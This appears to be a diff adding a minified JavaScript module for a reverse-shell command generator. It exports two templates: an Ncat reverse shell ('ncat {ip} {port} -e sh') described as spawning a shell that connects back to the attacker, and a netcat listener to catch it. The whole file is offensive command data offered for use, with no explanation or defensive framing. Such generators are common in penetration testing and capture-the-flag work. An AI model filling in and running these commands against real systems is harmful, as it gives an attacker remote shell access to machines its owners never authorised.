@@ -1,0 +1,1 @@
+const t=[{title:"Ncat -e reverse shell",template:"ncat {ip} {port} -e sh",description:"Uses Ncat to spawn a shell and connect back to the attacker."},{title:"Netcat Listener",template:"nc -lvnp {port}"}],e={commands:t};export{t as commands,e as default};
